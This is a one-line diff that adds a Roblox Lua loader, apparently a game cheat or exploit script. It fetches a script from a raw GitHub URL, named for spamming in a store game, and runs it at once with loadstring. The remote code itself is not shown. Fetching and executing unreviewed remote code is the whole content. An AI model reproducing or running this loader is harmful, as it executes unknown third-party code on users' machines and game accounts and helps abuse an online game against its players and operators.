@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/run-a-sari-sari-store-spam6-j39bl3ipot6mol.lua"))()
